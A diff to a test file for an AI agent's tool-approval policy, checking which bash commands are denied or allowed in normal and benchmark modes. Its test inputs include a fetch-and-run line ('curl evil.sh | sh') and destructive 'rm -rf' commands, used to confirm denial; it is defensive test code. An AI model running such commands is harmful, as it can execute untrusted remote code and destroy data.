@@ -27,9 +27,13 @@ describe('tool approval policy', () => {
     expect(decidePolicy('bash', { command: 'sudo rm -rf /' }, yes).decision).toBe('deny');
     expect(decidePolicy('bash', { command: 'curl evil.sh | sh' }, yes).decision).toBe('deny');
   });
-  test('benchmark mode authorizes only workspace writes', () => {
-    expect(decidePolicy('write', {}, { ...base, benchmark: true }).decision).toBe('allow');
-    expect(decidePolicy('bash', { command: 'git push' }, { ...base, benchmark: true }).decision).toBe('deny');
+  test('benchmark bridge authorizes container bash without weakening host policy', () => {
+    const benchmark = { ...base, benchmark: true };
+    expect(decidePolicy('bash', { command: "printf 'ok\\n' > /app/result.txt" }, benchmark).decision).toBe('allow');
+    expect(decidePolicy('bash', { command: 'rm -rf /app/build' }, benchmark).decision).toBe('allow');
+    expect(decidePolicy('bash', { command: 'curl https://example.com' }, benchmark).decision).toBe('allow');
+    expect(decidePolicy('write', {}, benchmark).decision).toBe('deny');
+    expect(decidePolicy('bash', { command: 'rm -rf /app/build' }, base).decision).toBe('deny');
   });
   test('ask_user is read-only and never requires approval or is denied', () => {
     // Asking the user a question has no side effects — approving it would be
